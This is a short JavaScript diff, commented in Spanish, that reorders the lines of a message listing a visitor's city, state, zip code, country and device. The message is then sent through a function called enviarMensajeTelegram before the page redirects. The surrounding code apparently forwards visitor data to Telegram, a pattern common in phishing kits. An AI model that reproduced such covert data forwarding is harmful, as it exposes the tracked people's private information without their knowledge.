@@ -100,8 +100,8 @@
                     // Formato con Pais al lado de Zip Code
                     message += '\nCiudad: ' + ciudad;
                     message += '\nEstado: ' + estado;
-                    message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
                     message += '\nDispositivo: ' + dispositivo;
+                    message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
 
                     enviarMensajeTelegram(message, nextPage);
                 })
